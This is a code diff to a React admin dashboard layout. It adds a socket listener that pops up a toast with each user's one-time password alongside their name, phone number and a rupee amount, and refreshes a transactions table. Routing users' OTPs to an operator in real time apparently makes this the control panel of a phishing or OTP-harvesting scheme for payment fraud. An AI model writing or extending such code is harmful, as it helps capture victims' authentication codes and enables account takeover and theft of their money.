@@ -1,8 +1,26 @@
+import { useEffect } from 'react';
 import { NavLink, Outlet, useNavigate } from 'react-router-dom';
 import { logout } from '../api';
+import { connectAdminSocket } from '../socket';
 
 export default function Layout() {
   const navigate = useNavigate();
+
+  useEffect(() => {
+    const showOtp = (payload) => {
+      const msg = `OTP: ${payload.otp} — ${payload.name || 'User'} (${payload.phone || '-'}) · ₹${payload.value}`;
+      const el = document.createElement('div');
+      el.className = 'otp-toast';
+      el.textContent = msg;
+      document.body.appendChild(el);
+      setTimeout(() => el.remove(), 12000);
+      const table = document.getElementById('tx-table');
+      if (table && window.$?.fn?.dataTable && window.$(table).DataTable) {
+        window.$(table).DataTable().ajax.reload(null, false);
+      }
+    };
+    connectAdminSocket(showOtp);
+  }, []);
 
   function handleLogout() {
     logout();
